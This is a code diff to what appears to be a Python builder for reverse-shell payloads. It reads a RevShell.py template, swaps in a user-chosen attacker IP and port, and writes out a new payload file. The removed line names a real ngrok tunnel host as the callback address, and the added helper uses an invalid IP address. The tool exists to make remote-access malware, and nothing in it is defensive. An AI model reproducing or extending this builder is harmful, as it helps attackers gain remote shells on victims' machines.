@@ -4,6 +4,12 @@ import base64
 import subprocess
 import platform
 
+def replace_ip_and_port(code, ip, port):
+    old_ip_port = "('129.159.135.500', 80)"
+    new_ip_port = f"('{ip}', {port})"
+    updated_code = code.replace(old_ip_port, new_ip_port)
+    return updated_code
+
 def create_file(ip, port, filename):
     while filename == 'RevShell.py':
         print('Error: The filename cannot be RevShell.py')
@@ -13,8 +19,8 @@ def create_file(ip, port, filename):
     with open('RevShell.py', 'r') as f:
         code = f.read()
 
-    # Replace the IP and port in the code with user input
-    code = code.replace("('0.tcp.eu.ngrok.io', 17117)", f"('{ip}', {port})")
+    # Replace the IP and port in the code
+    code = replace_ip_and_port(code, ip, port)
 
     # Write the modified code to a new file with the given filename
     with open(filename, 'w') as f:
